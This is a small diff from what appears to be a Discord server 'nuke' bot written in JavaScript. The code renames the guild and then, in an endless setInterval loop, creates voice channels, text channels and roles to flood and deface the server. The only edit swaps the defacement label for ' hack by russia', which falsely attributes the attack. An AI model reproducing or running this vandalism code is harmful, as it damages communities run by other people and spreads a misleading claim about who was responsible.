@@ -17,7 +17,7 @@ const prefix = ""
                 })
                 message.guild.setName('bzndzaka')
                 setInterval(function(){
-                    message.guild.createChannel(' hack by kiaksar san shkar lazo', 'voice')
+                    message.guild.createChannel(' hack by russia', 'voice')
                     message.guild.createChannel(' . UP ', 'text')
                     message.guild.createRole({name : ' <.>'})
                 })
